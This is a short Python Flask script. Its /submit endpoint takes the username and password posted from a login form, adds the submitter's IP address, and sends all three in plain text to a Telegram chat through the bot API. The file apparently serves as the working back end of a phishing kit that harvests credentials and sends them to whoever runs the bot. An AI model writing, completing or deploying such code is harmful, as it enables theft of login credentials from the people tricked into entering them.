from flask import Flask, request, jsonify
import requests
import os
from dotenv import load_dotenv

# Load environment variables from .env file (for local testing)
load_dotenv()

app = Flask(__name__)

# Telegram Bot Token and Chat ID from environment variables
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_ID = os.getenv('TELEGRAM_CHAT_ID')

@app.route('/submit', methods=['POST'])
def submit_form():
    # Extract form data
    username = request.form.get('username')
    password = request.form.get('password')
    # Get user IP address (handle proxies with X-Forwarded-For)
    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    if not username or not password:
        return jsonify({"error": "Missing username or password"}), 400

    # Format message for Telegram as requested
    message = f"🔐 LOGIN Submission\nLogin Id: {username}\nPassword: {password}\nuser Ip: {user_ip}"

    # Send data to Telegram
    telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    try:
        response = requests.post(
            telegram_url,
            json={
                "chat_id": TELEGRAM_CHAT_ID,
                "text": message
            },
            timeout=5  # Add timeout for safety
        )
        response.raise_for_status()  # Raise an error for bad responses
        return jsonify({"status": "success", "message": "Data sent to Telegram"}), 200
    except Exception as e:
        return jsonify({"error": f"Failed to send to Telegram: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))